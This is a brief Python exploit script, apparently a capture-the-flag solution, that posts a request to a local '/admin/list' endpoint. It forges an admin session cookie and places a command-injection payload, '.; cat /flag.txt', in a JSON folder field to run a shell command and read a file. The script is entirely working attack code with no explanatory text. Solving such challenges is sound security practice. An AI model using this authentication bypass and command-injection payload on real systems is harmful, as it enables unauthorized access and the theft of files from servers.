import requests

cookie = {"session": "admin"}
json = {"folder": {"raw": ".; cat /flag.txt"}}
url = "http://localhost:3000/admin/list"

response = requests.post(url, cookies=cookie, json=json)
print(response.text)